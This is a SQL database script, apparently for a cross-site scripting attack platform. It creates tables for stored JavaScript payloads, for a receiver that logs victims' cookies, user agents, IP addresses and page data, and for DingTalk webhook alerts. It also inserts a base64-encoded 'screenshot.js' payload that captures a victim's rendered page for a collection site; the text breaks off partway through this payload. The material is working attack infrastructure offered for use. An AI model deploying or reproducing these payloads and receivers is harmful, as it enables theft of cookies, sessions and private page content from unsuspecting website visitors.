DROP TABLE IF EXISTS `xssmadao`;
create table xssmadao
(
    column_1 int null
) DEFAULT CHARSET=utf8;



DROP TABLE IF EXISTS `dingconfig`;
create table dingconfig
(
    webhook   varchar(250) null,
    isNotice  tinyint      null,
    msgConfig int          null
) DEFAULT CHARSET=utf8;


DROP TABLE IF EXISTS `payloads`;
create table payloads
(
    name   varchar(200)  not null,
    `desc` varchar(200)  null,
    jscode mediumtext    null,
    love   int default 0 not null,
    constraint payloads_name_uindex
        unique (name)
) DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `reciver`;
create table reciver
(
    host           varchar(30)  null,
    connection     varchar(20)  null,
    userAgent      varchar(200) null,
    accept         varchar(200) null,
    acceptEncoding varchar(200) null,
    cookie         varchar(200) null,
    time           varchar(60)  null,
    data           mediumtext   null,
    ip             varchar(30)  null
) DEFAULT CHARSET=utf8;



INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('screenshot.js', 'screenshot', 'dmFyIHdlYnNpdGU9Imh0dHA6Ly/nvZHnq5nlnLDlnYAvIjsoZnVuY3Rpb24odCxlLG4scixvLGkpe2Z1bmN0aW9uIGEodCxlLG4scixvKXtyZXR1cm4gZyh0LHQsbixyLGUsdC5kZWZhdWx0Vmlldy5wYWdlWE9mZnNldCx0LmRlZmF1bHRWaWV3LnBhZ2VZT2Zmc2V0KS50aGVuKGZ1bmN0aW9uKGkpe04oIkRvY3VtZW50IGNsb25lZCIpO3ZhciBhPVllK28sYz0iWyIrYSsiPSciK28rIiddIjt0LnF1ZXJ5U2VsZWN0b3IoYykucmVtb3ZlQXR0cmlidXRlKGEpO3ZhciBoPWkuY29udGVudFdpbmRvdyxsPWguZG9jdW1lbnQucXVlcnlTZWxlY3RvcihjKSx1PVByb21pc2UucmVzb2x2ZSgiZnVuY3Rpb24iPT10eXBlb2YgZS5vbmNsb25lP2Uub25jbG9uZShoLmRvY3VtZW50KTohMCk7cmV0dXJuIHUudGhlbihmdW5jdGlvbigpe3JldHVybiBzKGwsaSxlLG4scil9KX0pfWZ1bmN0aW9uIHModCxuLHIsbyxpKXt2YXIgYT1uLmNvbnRlbnRXaW5kb3cscz1uZXcgX2UoYS5kb2N1bWVudCksZD1uZXcgUChyLHMpLHA9Vih0KSxmPSJ2aWV3Ij09PXIudHlwZT9vOmwoYS5kb2N1bWVudCksZz0idmlldyI9PT1yLnR5cGU/aTp1KGEuZG9jdW1lbnQpLG09bmV3IHIucmVuZGVyZXIoZixnLGQscixlKSx5PW5ldyBVKHQsbSxzLGQscik7cmV0dXJuIHkucmVhZHkudGhlbihmdW5jdGlvbigpe04oIkZpbmlzaGVkIHJlbmRlcmluZyIpO3ZhciBlO3JldHVybiBlPSJ2aWV3Ij09PXIudHlwZT9oKG0uY2FudmFzLHt3aWR0aDptLmNhbnZhcy53aWR0aCxoZWlnaHQ6bS5jYW52YXMuaGVpZ2h0LHRvcDowLGxlZnQ6MCx4OjAseTowfSk6dD09PWEuZG9jdW1lbnQuYm9keXx8dD09PWEuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50fHxudWxsIT1yLmNhbnZhcz9tLmNhbnZhczpoKG0uY2FudmFzLHt3aWR0aDpudWxsIT1yLndpZHRoP3Iud2lkdGg6cC53aWR0aCxoZWlnaHQ6bnVsbCE9ci5oZWlnaHQ/ci5oZWlnaHQ6cC5oZWlnaHQsdG9wOnAudG9wLGxlZnQ6cC5sZWZ0LHg6YS5wYWdlWE9mZnNldCx5OmEucGFnZVlPZmZzZXR9KSxjKG4sciksZX0pfWZ1bmN0aW9uIGModCxlKXtlLnJlbW92ZUNvbnRhaW5lciYmKHQucGFyZW50Tm9kZS5yZW1vdmVDaGlsZCh0KSxOKCJDbGVhbmVkIHVwIGNvbnRhaW5lciIpKX1mdW5jdGlvbiBoKHQsbil7dmFyIHI9ZS5jcmVhdGVFbGVtZW50KCJjYW52YXMiKSxvPU1hdGgubWluKHQud2lkdGgtMSxNYXRoLm1heCgwLG4ubGVmdCkpLGk9TWF0aC5taW4odC53aWR0aCxNYXRoLm1heCgxLG4ubGVmdCtuLndpZHRoKSksYT1NYXRoLm1pbih0LmhlaWdodC0xLE1hdGgubWF4KDAsbi50b3ApKSxzPU1hdGgubWluKHQuaGVpZ2h0LE1hdGgubWF4KDEsbi50b3Arbi5oZWlnaHQpKTtyZXR1cm4gci53aWR0aD1uLndpZHRoLHIuaGVpZ2h0PW4uaGVpZ2h0LE4oIkNyb3BwaW5nIGNhbnZhcyBhdDoiLCJsZWZ0OiIsbi5sZWZ0LCJ0b3A6IixuLnRvcCwid2lkdGg6IixpLW8sImhlaWdodDoiLHMtYSksTigiUmVzdWx0aW5nIGNyb3Agd2l0aCB3aWR0aCIsbi53aWR0aCwiYW5kIGhlaWdodCIsbi5oZWlnaHQsIiB3aXRoIHgiLG8sImFuZCB5IixhKSxyLmdldENvbnRleHQoIjJkIikuZHJhd0ltYWdlKHQsbyxhLGktbyxzLWEsbi54LG4ueSxpLW8scy1hKSxyfWZ1bmN0aW9uIGwodCl7cmV0dXJuIE1hdGgubWF4KE1hdGgubWF4KHQuYm9keS5zY3JvbGxXaWR0aCx0LmRvY3VtZW50RWxlbWVudC5zY3JvbGxXaWR0aCksTWF0aC5tYXgodC5ib2R5Lm9mZnNldFdpZHRoLHQuZG9jdW1lbnRFbGVtZW50Lm9mZnNldFdpZHRoKSxNYXRoLm1heCh0LmJvZHkuY2xpZW50V2lkdGgsdC5kb2N1bWVudEVsZW1lbnQuY2xpZW50V2lkdGgpKX1mdW5jdGlvbiB1KHQpe3JldHVybiBNYXRoLm1heChNYXRoLm1heCh0LmJvZHkuc2Nyb2xsSGVpZ2h0LHQuZG9jdW1lbnRFbGVtZW50LnNjcm9sbEhlaWdodCksTWF0aC5tYXgodC5ib2R5Lm9mZnNldEhlaWdodCx0LmRvY3VtZW50RWxlbWVudC5vZmZzZXRIZWlnaHQpLE1hdGgubWF4KHQuYm9keS5jbGllbnRIZWlnaHQsdC5kb2N1bWVudEVsZW1lbnQuY2xpZW50SGVpZ2h0KSl9ZnVuY3Rpb24gZCgpe3JldHVybiJkYXRhOmltYWdlL2dpZjtiYXNlNjQsUjBsR09EbGhBUUFCQUlBQUFBQUFBUC8vL3lINUJBRUFBQUFBTEFBQUFBQUJBQUVBQUFJQlJBQTcifWZ1bmN0aW9uIHAoKXtyZXR1cm4gZS5kb2N1bWVudE1vZGUmJmUuZG9jdW1lbnRNb2RlPD05fWZ1bmN0aW9uIGYodCxuKXtmb3IodmFyIHI9Mz09PXQubm9kZVR5cGU/ZS5jcmVhdGVUZXh0Tm9kZSh0Lm5vZGVWYWx1ZSk6dC5jbG9uZU5vZGUoITEpLG89dC5maXJzdENoaWxkO287KShuPT09ITB8fDEhPT1vLm5vZGVUeXBlfHwiU0NSSVBUIiE9PW8ubm9kZU5hbWUpJiZyLmFwcGVuZENoaWxkKGYobyxuKSksbz1vLm5leHRTaWJsaW5nO3JldHVybiByfWZ1bmN0aW9uIGcodCxlLG4scixvLGksYSl7dyh0KTt2YXIgcz1wKCk/Zih0LmRvY3VtZW50RWxlbWVudCxvLmphdmFzY3JpcHRFbmFibGVkKTp0LmRvY3VtZW50RWxlbWVudC5jbG9uZU5vZGUoITApLGM9ZS5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTtyZXR1cm4gYy5jbGFzc05hbWU9Imh0bWwyY2FudmFzLWNvbnRhaW5lciIsYy5zdHlsZS52aXNpYmlsaXR5PSJoaWRkZW4iLGMuc3R5bGUucG9zaXRpb249ImZpeGVkIixjLnN0eWxlLmxlZnQ9Ii0xMDAwMHB4IixjLnN0eWxlLnRvcD0iMHB4IixjLnN0eWxlLmJvcmRlcj0iMCIsYy53aWR0aD1uLGMuaGVpZ2h0PXIsYy5zY3JvbGxpbmc9Im5vIixlLmJvZHkuYXBwZW5kQ2hpbGQoYyksbmV3IFByb21pc2UoZnVuY3Rpb24oZSl7dmFyIG49Yy5jb250ZW50V2luZG93LmRvY3VtZW50O20odC5kb2N1bWVudEVsZW1lbnQscywidGV4dGFyZWEiKSxtKHQuZG9jdW1lbnRFbGVtZW50LHMsInNlbGVjdCIpLGMuY29udGVudFdpbmRvdy5vbmxvYWQ9Yy5vbmxvYWQ9ZnVuY3Rpb24oKXt2YXIgcj1zZXRJbnRlcnZhbChmdW5jdGlvbigpe24uYm9keS5jaGlsZE5vZGVzLmxlbmd0aD4wJiYoeCh0LG4pLGNsZWFySW50ZXJ2YWwociksInZpZXciPT09by50eXBlJiZjLmNvbnRlbnRXaW5kb3cuc2Nyb2xsVG8oaSxhKSxlKGMpKX0sNTApfSxuLm9wZW4oKSxuLndyaXRlKCI8IURPQ1RZUEUgaHRtbD48aHRtbD48L2h0bWw+IikseSh0LGksYSksbi5yZXBsYWNlQ2hpbGQoby5qYXZhc2NyaXB0RW5hYmxlZD09PSEwP24uYWRvcHROb2RlKHMpOkUobi5hZG9wdE5vZGUocykpLG4uZG9jdW1lbnRFbGVtZW50KSxuLmNsb3NlKCl9KX1mdW5jdGlvbiBtKHQsZSxuKXtmb3IodmFyIHI9dC5nZXRFbGVtZW50c0J5VGFnTmFtZShuKSxvPWUuZ2V0RWxlbWVudHNCeVRhZ05hbWUobiksaT1yLmxlbmd0aCxhPTA7aT5hO2ErKylvW2FdLnZhbHVlPXJbYV0udmFsdWV9ZnVuY3Rpb24geSh0LGUsbil7IXQuZGVmYXVsdFZpZXd8fGU9PT10LmRlZmF1bHRWaWV3LnBhZ2VYT2Zmc2V0JiZuPT09dC5kZWZhdWx0Vmlldy5wYWdlWU9mZnNldHx8dC5kZWZhdWx0Vmlldy5zY3JvbGxUbyhlLG4pfWZ1bmN0aW9uIHYoZSxuLHIsbyxpLGEpe3JldHVybiBuZXcgT2UoZSxuLHQuZG9jdW1lbnQpLnRoZW4oYihlKSkudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gZyh0LHIsbyxpLGEsMCwwKX0pfWZ1bmN0aW9uIGIodCl7cmV0dXJuIGZ1bmN0aW9uKG4pe3ZhciByLG89bmV3IERPTVBhcnNlcjt0cnl7cj1vLnBhcnNlRnJvbVN0cmluZyhuLCJ0ZXh0L2h0bWwiKX1jYXRjaChpKXtOKCJET01QYXJzZXIgbm90IHN1cHBvcnRlZCwgZmFsbGluZyBiYWNrIHRvIGNyZWF0ZUhUTUxEb2N1bWVudCIpLHI9ZS5pbXBsZW1lbnRhdGlvbi5jcmVhdGVIVE1MRG9jdW1lbnQoIiIpO3RyeXtyLm9wZW4oKSxyLndyaXRlKG4pLHIuY2xvc2UoKX1jYXRjaChhKXtOKCJjcmVhdGVIVE1MRG9jdW1lbnQgd3JpdGUgbm90IHN1cHBvcnRlZCwgZmFsbGluZyBiYWNrIHRvIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MIiksci5ib2R5LmlubmVySFRNTD1ufX12YXIgcz1yLnF1ZXJ5U2VsZWN0b3IoImJhc2UiKTtpZighc3x8IXMuaHJlZi5ob3N0KXt2YXIgYz1yLmNyZWF0ZUVsZW1lbnQoImJhc2UiKTtjLmhyZWY9dCxyLmhlYWQuaW5zZXJ0QmVmb3JlKGMsci5oZWFkLmZpcnN0Q2hpbGQpfXJldHVybiByfX1mdW5jdGlvbiB3KHQpe1tdLnNsaWNlLmNhbGwodC5xdWVyeVNlbGVjdG9yQWxsKCJjYW52YXMiKSwwKS5mb3JFYWNoKGZ1bmN0aW9uKHQpe3Quc2V0QXR0cmlidXRlKEdlLCJjYW52YXMtIitRZSsrKX0pfWZ1bmN0aW9uIHgodCxlKXtbXS5zbGljZS5jYWxsKHQucXVlcnlTZWxlY3RvckFsbCgiWyIrR2UrIl0iKSwwKS5mb3JFYWNoKGZ1bmN0aW9uKHQpe3RyeXt2YXIgbj1lLnF1ZXJ5U2VsZWN0b3IoIlsiK0dlKyc9IicrdC5nZXRBdHRyaWJ1dGUoR2UpKyciXScpO24mJihuLndpZHRoPXQud2lkdGgsbi5oZWlnaHQ9dC5oZWlnaHQsbi5nZXRDb250ZXh0KCIyZCIpLnB1dEltYWdlRGF0YSh0LmdldENvbnRleHQoIjJkIikuZ2V0SW1hZ2VEYXRhKDAsMCx0LndpZHRoLHQuaGVpZ2h0KSwwLDApKX1jYXRjaChyKXtOKCJVbmFibGUgdG8gY29weSBjYW52YXMgY29udGVudCBmcm9tIix0LHIpfXQucmVtb3ZlQXR0cmlidXRlKEdlKX0pfWZ1bmN0aW9uIEUodCl7cmV0dXJuW10uc2xpY2UuY2FsbCh0LmNoaWxkTm9kZXMsMCkuZmlsdGVyKFQpLmZvckVhY2goZnVuY3Rpb24oZSl7IlNDUklQVCI9PT1lLnRhZ05hbWU/dC5yZW1vdmVDaGlsZChlKTpFKGUpfSksdH1mdW5jdGlvbiBUKHQpe3JldHVybiB0Lm5vZGVUeXBlPT09Tm9kZS5FTEVNRU5UX05PREV9ZnVuY3Rpb24gayh0KXt2YXIgbj1lLmNyZWF0ZUVsZW1lbnQoImEiKTtyZXR1cm4gbi5ocmVmPXQsbi5ocmVmPW4uaHJlZixufWZ1bmN0aW9uIEModCl7dGhpcy5yPTAsdGhpcy5nPTAsdGhpcy5iPTAsdGhpcy5hPW51bGw7dGhpcy5mcm9tQXJyYXkodCl8fHRoaXMubmFtZWRDb2xvcih0KXx8dGhpcy5yZ2IodCl8fHRoaXMucmdiYSh0KXx8dGhpcy5oZXg2KHQpfHx0aGlzLmhleDModCl9ZnVuY3Rpb24gUyh0KXtpZih0aGlzLnNyYz10LE4oIkR1bW15SW1hZ2VDb250YWluZXIgZm9yIix0KSwhdGhpcy5wcm9taXNlfHwhdGhpcy5pbWFnZSl7TigiSW5pdGlhdGluZyBEdW1teUltYWdlQ29udGFpbmVyIiksUy5wcm90b3R5cGUuaW1hZ2U9bmV3IEltYWdlO3ZhciBlPXRoaXMuaW1hZ2U7Uy5wcm90b3R5cGUucHJvbWlzZT1uZXcgUHJvbWlzZShmdW5jdGlvbih0LG4pe2Uub25sb2FkPXQsZS5vbmVycm9yPW4sZS5zcmM9ZCgpLGUuY29tcGxldGU9PT0hMCYmdChlKX0pfX1mdW5jdGlvbiBJKHQsbil7dmFyIHIsbyxpPWUuY3JlYXRlRWxlbWVudCgiZGl2IiksYT1lLmNyZWF0ZUVsZW1lbnQoImltZyIpLHM9ZS5jcmVhdGVFbGVtZW50KCJzcGFuIiksYz0iSGlkZGVuIFRleHQiO2kuc3R5bGUudmlzaWJpbGl0eT0iaGlkZGVuIixpLnN0eWxlLmZvbnRGYW1pbHk9dCxpLnN0eWxlLmZvbnRTaXplPW4saS5zdHlsZS5tYXJnaW49MCxpLnN0eWxlLnBhZGRpbmc9MCxlLmJvZHkuYXBwZW5kQ2hpbGQoaSksYS5zcmM9ZCgpLGEud2lkdGg9MSxhLmhlaWdodD0xLGEuc3R5bGUubWFyZ2luPTAsYS5zdHlsZS5wYWRkaW5nPTAsYS5zdHlsZS52ZXJ0aWNhbEFsaWduPSJiYXNlbGluZSIscy5zdHlsZS5mb250RmFtaWx5PXQscy5zdHlsZS5mb250U2l6ZT1uLHMuc3R5bGUubWFyZ2luPTAscy5zdHlsZS5wYWRkaW5nPTAscy5hcHBlbmRDaGlsZChlLmNyZWF0ZVRleHROb2RlKGMpKSxpLmFwcGVuZENoaWxkKHMpLGkuYXBwZW5kQ2hpbGQoYSkscj1hLm9mZnNldFRvcC1zLm9mZnNldFRvcCsxLGkucmVtb3ZlQ2hpbGQocyksaS5hcHBlbmRDaGlsZChlLmNyZWF0ZVRleHROb2RlKGMpKSxpLnN0eWxlLmxpbmVIZWlnaHQ9Im5vcm1hbCIsYS5zdHlsZS52ZXJ0aWNhbEFsaWduPSJzdXBlciIsbz1hLm9mZnNldFRvcC1pLm9mZnNldFRvcCsxLGUuYm9keS5yZW1vdmVDaGlsZChpKSx0aGlzLmJhc2VsaW5lPXIsdGhpcy5saW5lV2lkdGg9MSx0aGlzLm1pZGRsZT1vfWZ1bmN0aW9uIE8oKXt0aGlzLmRhdGE9e319ZnVuY3Rpb24gUih0LGUsbil7dGhpcy5pbWFnZT1udWxsLHRoaXMuc3JjPXQ7dmFyIHI9dGhpcyxvPVYodCk7dGhpcy5wcm9taXNlPShlP25ldyBQcm9taXNlKGZ1bmN0aW9uKGUpeyJhYm91dDpibGFuayI9PT10LmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQuVVJMfHxudWxsPT10LmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50P3QuY29udGVudFdpbmRvdy5vbmxvYWQ9dC5vbmxvYWQ9ZnVuY3Rpb24oKXtlKHQpfTplKHQpfSk6dGhpcy5wcm94eUxvYWQobi5wcm94eSxvLG4pKS50aGVuKGZ1bmN0aW9uKHQpe3JldHVybiBodG1sMmNhbnZhcyh0LmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LHt0eXBlOiJ2aWV3Iix3aWR0aDp0LndpZHRoLGhlaWdodDp0LmhlaWdodCxwcm94eTpuLnByb3h5LGphdmFzY3JpcHRFbmFibGVkOm4uamF2YXNjcmlwdEVuYWJsZWQscmVtb3ZlQ29udGFpbmVyOm4ucmVtb3ZlQ29udGFpbmVyLGFsbG93VGFpbnQ6bi5hbGxvd1RhaW50LGltYWdlVGltZW91dDpuLmltYWdlVGltZW91dC8yfSl9KS50aGVuKGZ1bmN0aW9uKHQpe3JldHVybiByLmltYWdlPXR9KX1mdW5jdGlvbiBBKHQpe3RoaXMuc3JjPXQudmFsdWUsdGhpcy5jb2xvclN0b3BzPVtdLHRoaXMudHlwZT1udWxsLHRoaXMueDA9LjUsdGhpcy55MD0uNSx0aGlzLngxPS41LHRoaXMueTE9LjUsdGhpcy5wcm9taXNlPVByb21pc2UucmVzb2x2ZSghMCl9ZnVuY3Rpb24gTSh0LGUpe3RoaXMuc3JjPXQsdGhpcy5pbWFnZT1uZXcgSW1hZ2U7dmFyIG49dGhpczt0aGlzLnRhaW50ZWQ9bnVsbCx0aGlzLnByb21pc2U9bmV3IFByb21pc2UoZnVuY3Rpb24ocixvKXtuLmltYWdlLm9ubG9hZD1yLG4uaW1hZ2Uub25lcnJvcj1vLGUmJihuLmltYWdlLmNyb3NzT3JpZ2luPSJhbm9ueW1vdXMiKSxuLmltYWdlLnNyYz10LG4uaW1hZ2UuY29tcGxldGU9PT0hMCYmcihuLmltYWdlKX0pfWZ1bmN0aW9uIFAoZSxuKXt0aGlzLmxpbms9bnVsbCx0aGlzLm9wdGlvbnM9ZSx0aGlzLnN1cHBvcnQ9bix0aGlzLm9yaWdpbj10aGlzLmdldE9yaWdpbih0LmxvY2F0aW9uLmhyZWYpfWZ1bmN0aW9uIEwodCl7QS5hcHBseSh0aGlzLGFyZ3VtZW50cyksdGhpcy50eXBlPXRoaXMuVFlQRVMuTElORUFSO3ZhciBlPW51bGw9PT10LmFyZ3NbMF0ubWF0Y2godGhpcy5zdGVwUmVnRXhwKTtlP3QuYXJnc1swXS5zcGxpdCgiICIpLnJldmVyc2UoKS5mb3JFYWNoKGZ1bmN0aW9uKHQpe3N3aXRjaCh0KXtjYXNlImxlZnQiOnRoaXMueDA9MCx0aGlzLngxPTE7YnJlYWs7Y2FzZSJ0b3AiOnRoaXMueTA9MCx0aGlzLnkxPTE7YnJlYWs7Y2FzZSJyaWdodCI6dGhpcy54MD0xLHRoaXMueDE9MDticmVhaztjYXNlImJvdHRvbSI6dGhpcy55MD0xLHRoaXMueTE9MDticmVhaztjYXNlInRvIjp2YXIgZT10aGlzLnkwLG49dGhpcy54MDt0aGlzLnkwPXRoaXMueTEsdGhpcy54MD10aGlzLngxLHRoaXMueDE9bix0aGlzLnkxPWV9fSx0aGlzKToodGhpcy55MD0wLHRoaXMueTE9MSksdGhpcy5jb2xvclN0b3BzPXQuYXJncy5zbGljZShlPzE6MCkubWFwKGZ1bmN0aW9uKHQpe3ZhciBlPXQubWF0Y2godGhpcy5zdGVwUmVnRXhwKTtyZXR1cm57Y29sb3I6bmV3IEMoZVsxXSksc3RvcDoiJSI9PT1lWzNdP2VbMl0vMTAwOm51bGx9fSx0aGlzKSxudWxsPT09dGhpcy5jb2xvclN0b3BzWzBdLnN0b3AmJih0aGlzLmNvbG9yU3RvcHNbMF0uc3RvcD0wKSxudWxsPT09dGhpcy5jb2xvclN0b3BzW3RoaXMuY29sb3JTdG9wcy5sZW5ndGgtMV0uc3RvcCYmKHRoaXMuY29sb3JTdG9wc1t0aGlzLmNvbG9yU3RvcHMubGVuZ3RoLTFdLnN0b3A9MSksdGhpcy5jb2xvclN0b3BzLmZvckVhY2goZnVuY3Rpb24odCxlKXtudWxsPT09dC5zdG9wJiZ0aGlzLmNvbG9yU3RvcHMuc2xpY2UoZSkuc29tZShmdW5jdGlvbihuLHIpe3JldHVybiBudWxsIT09bi5zdG9wPyh0LnN0b3A9KG4uc3RvcC10aGlzLmNvbG9yU3RvcHNbZS0xXS5zdG9wKS8ocisxKSt0aGlzLmNvbG9yU3RvcHNbZS0xXS5zdG9wLCEwKTohMX0sdGhpcyl9LHRoaXMpfWZ1bmN0aW9uIE4oKXt0Lmh0bWwyY2FudmFzLmxvZ2dpbmcmJnQuY29uc29sZSYmdC5jb25zb2xlLmxvZyYmRnVuY3Rpb24ucHJvdG90eXBlLmJpbmQuY2FsbCh0LmNvbnNvbGUubG9nLHQuY29uc29sZSkuYXBwbHkodC5jb25zb2xlLFtEYXRlLm5vdygpLXQuaHRtbDJjYW52YXMuc3RhcnQrIm1zIiwiaHRtbDJjYW52YXM6Il0uY29uY2F0KFtdLnNsaWNlLmNhbGwoYXJndW1lbnRzLDApKSl9ZnVuY3Rpb24gRCh0LGUpe3RoaXMubm9kZT10LHRoaXMucGFyZW50PWUsdGhpcy5zdGFjaz1udWxsLHRoaXMuYm91bmRzPW51bGwsdGhpcy5ib3JkZXJzPW51bGwsdGhpcy5jbGlwPVtdLHRoaXMuYmFja2dyb3VuZENsaXA9W10sdGhpcy5vZmZzZXRCb3VuZHM9bnVsbCx0aGlzLnZpc2libGU9bnVsbCx0aGlzLmNvbXB1dGVkU3R5bGVzPW51bGwsdGhpcy5jb2xvcnM9e30sdGhpcy5zdHlsZXM9e30sdGhpcy5iYWNrZ3JvdW5kSW1hZ2VzPW51bGwsdGhpcy50cmFuc2Zvcm1EYXRhPW51bGwsdGhpcy50cmFuc2Zvcm1NYXRyaXg9bnVsbCx0aGlzLmlzUHNldWRvRWxlbWVudD0hMSx0aGlzLm9wYWNpdHk9bnVsbH1mdW5jdGlvbiBCKHQpe3ZhciBlPXQub3B0aW9uc1t0LnNlbGVjdGVkSW5kZXh8fDBdO3JldHVybiBlP2UudGV4dHx8IiI6IiJ9ZnVuY3Rpb24gXyh0KXtyZXR1cm4gdCYmIm1hdHJpeCI9PT10WzFdP3RbMl0uc3BsaXQoIiwiKS5tYXAoZnVuY3Rpb24odCl7cmV0dXJuIHBhcnNlRmxvYXQodC50cmltKCkpfSk6aX1mdW5jdGlvbiBGKHQpe3JldHVybi0xIT09KCIiK3QpLmluZGV4T2YoIiUiKX1mdW5jdGlvbiBqKHQpe3ZhciBlLG4scixvLGEscyxjLGg9IiBcclxuICIsbD1bXSx1PTAsZD0wLHA9ZnVuY3Rpb24oKXtlJiYoJyInPT09bi5zdWJzdHIoMCwxKSYmKG49bi5zdWJzdHIoMSxuLmxlbmd0aC0yKSksbiYmYy5wdXNoKG4pLCItIj09PWUuc3Vic3RyKDAsMSkmJihvPWUuaW5kZXhPZigiLSIsMSkrMSk+MCYmKHI9ZS5zdWJzdHIoMCxvKSxlPWUuc3Vic3RyKG8pKSxsLnB1c2goe3ByZWZpeDpyLG1ldGhvZDplLnRvTG93ZXJDYXNlKCksdmFsdWU6YSxhcmdzOmMsaW1hZ2U6bnVsbH0pKSxjPVtdLGU9cj1uPWE9IiJ9O3JldHVybiBjPVtdLGU9cj1uPWE9IiIsdC5zcGxpdCgiIikuZm9yRWFjaChmdW5jdGlvbih0KXtpZigwIT09dXx8aC5pbmRleE9mKHQpPD0tMSl7c3dpdGNoKHQpe2Nhc2UnIic6cz9zPT09dCYmKHM9bnVsbCk6cz10O2JyZWFrO2Nhc2UiKCI6aWYocylicmVhaztpZigwPT09dSlyZXR1cm4gdT0xLGErPXQsaTtkKys7YnJlYWs7Y2FzZSIpIjppZihzKWJyZWFrO2lmKDE9PT11KXtpZigwPT09ZClyZXR1cm4gdT0wLGErPXQscCgpLGk7ZC0tfWJyZWFrO2Nhc2UiLCI6aWYocylicmVhaztpZigwPT09dSlyZXR1cm4gcCgpLGk7aWYoMT09PXUmJjA9PT1kJiYhZS5tYXRjaCgvXnVybCQvaSkpcmV0dXJuIGMucHVzaChuKSxuPSIiLGErPXQsaX1hKz10LDA9PT11P2UrPXQ6bis9dH19KSxwKCksbH1mdW5jdGlvbiBXKHQpe3JldHVybiB0LnJlcGxhY2UoInB4IiwiIil9ZnVuY3Rpb24gSCh0KXtyZXR1cm4gcGFyc2VGbG9hdCh0KX1mdW5jdGlvbiBWKHQpe2lmKHQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KXt2YXIgZT10LmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpLG49bnVsbD09dC5vZmZzZXRXaWR0aD9lLndpZHRoOnQub2Zmc2V0V2lkdGg7cmV0dXJue3RvcDplLnRvcCxib3R0b206ZS5ib3R0b218fGUudG9wK2UuaGVpZ2h0LHJpZ2h0OmUubGVmdCtuLGxlZnQ6ZS5sZWZ0LHdpZHRoOm4saGVpZ2h0Om51bGw9PXQub2Zmc2V0SGVpZ2h0P2UuaGVpZ2h0OnQub2Zmc2V0SGVpZ2h0fX1yZXR1cm57fX1mdW5jdGlvbiB6KHQpe3ZhciBlPXQub2Zmc2V0UGFyZW50P3oodC5vZmZzZXRQYXJlbnQpOnt0b3A6MCxsZWZ0OjB9O3JldHVybnt0b3A6dC5vZmZzZXRUb3ArZS50b3AsYm90dG9tOnQub2Zmc2V0VG9wK3Qub2Zmc2V0SGVpZ2h0K2UudG9wLHJpZ2h0OnQub2Zmc2V0TGVmdCtlLmxlZnQrdC5vZmZzZXRXaWR0aCxsZWZ0OnQub2Zmc2V0TGVmdCtlLmxlZnQsd2lkdGg6dC5vZmZzZXRXaWR0aCxoZWlnaHQ6dC5vZmZzZXRIZWlnaHR9fWZ1bmN0aW9uIFUodCxlLG4scixvKXtOKCJTdGFydGluZyBOb2RlUGFyc2VyIiksdGhpcy5yZW5kZXJlcj1lLHRoaXMub3B0aW9ucz1vLHRoaXMucmFuZ2U9bnVsbCx0aGlzLnN1cHBvcnQ9bix0aGlzLnJlbmRlclF1ZXVlPVtdLHRoaXMuc3RhY2s9bmV3IEJlKCEwLDEsdC5vd25lckRvY3VtZW50LG51bGwpO3ZhciBpPW5ldyBEKHQsbnVsbCk7aWYoby5iYWNrZ3JvdW5kJiZlLnJlY3RhbmdsZSgwLDAsZS53aWR0aCxlLmhlaWdodCxuZXcgQyhvLmJhY2tncm91bmQpKSx0PT09dC5vd25lckRvY3VtZW50LmRvY3VtZW50RWxlbWVudCl7dmFyIGE9bmV3IEQoaS5jb2xvcigiYmFja2dyb3VuZENvbG9yIikuaXNUcmFuc3BhcmVudCgpP3Qub3duZXJEb2N1bWVudC5ib2R5OnQub3duZXJEb2N1bWVudC5kb2N1bWVudEVsZW1lbnQsbnVsbCk7ZS5yZWN0YW5nbGUoMCwwLGUud2lkdGgsZS5oZWlnaHQsYS5jb2xvcigiYmFja2dyb3VuZENvbG9yIikpfWkudmlzaWJpbGU9aS5pc0VsZW1lbnRWaXNpYmxlKCksdGhpcy5jcmVhdGVQc2V1ZG9IaWRlU3R5bGVzKHQub3duZXJEb2N1bWVudCksdGhpcy5kaXNhYmxlQW5pbWF0aW9ucyh0Lm93bmVyRG9jdW1lbnQpLHRoaXMubm9kZXM9VGUoW2ldLmNvbmNhdCh0aGlzLmdldENoaWxkcmVuKGkpKS5maWx0ZXIoZnVuY3Rpb24odCl7cmV0dXJuIHQudmlzaWJsZT10LmlzRWxlbWVudFZpc2libGUoKX0pLm1hcCh0aGlzLmdldFBzZXVkb0VsZW1lbnRzLHRoaXMpKSx0aGlzLmZvbnRNZXRyaWNzPW5ldyBPLE4oIkZldGNoZWQgbm9kZXMsIHRvdGFsOiIsdGhpcy5ub2Rlcy5sZW5ndGgpLE4oIkNhbGN1bGF0ZSBvdmVyZmxvdyBjbGlwcyIpLHRoaXMuY2FsY3VsYXRlT3ZlcmZsb3dDbGlwcygpLE4oIlN0YXJ0IGZldGNoaW5nIGltYWdlcyIpLHRoaXMuaW1hZ2VzPXIuZmV0Y2godGhpcy5ub2Rlcy5maWx0ZXIoZmUpKSx0aGlzLnJlYWR5PXRoaXMuaW1hZ2VzLnJlYWR5LnRoZW4oYmUoZnVuY3Rpb24oKXtyZXR1cm4gTigiSW1hZ2VzIGxvYWRlZCwgc3RhcnRpbmcgcGFyc2luZyIpLE4oIkNyZWF0aW5nIHN0YWNraW5nIGNvbnRleHRzIiksdGhpcy5jcmVhdGVTdGFja2luZ0NvbnRleHRzKCksTigiU29ydGluZyBzdGFja2luZyBjb250ZXh0cyIpLHRoaXMuc29ydFN0YWNraW5nQ29udGV4dHModGhpcy5zdGFjayksdGhpcy5wYXJzZSh0aGlzLnN0YWNrKSxOKCJSZW5kZXIgcXVldWUgY3JlYXRlZCB3aXRoICIrdGhpcy5yZW5kZXJRdWV1ZS5sZW5ndGgrIiBpdGVtcyIpLG5ldyBQcm9taXNlKGJlKGZ1bmN0aW9uKHQpe28uYXN5bmM/ImZ1bmN0aW9uIj09dHlwZW9mIG8uYXN5bmM/by5hc3luYy5jYWxsKHRoaXMsd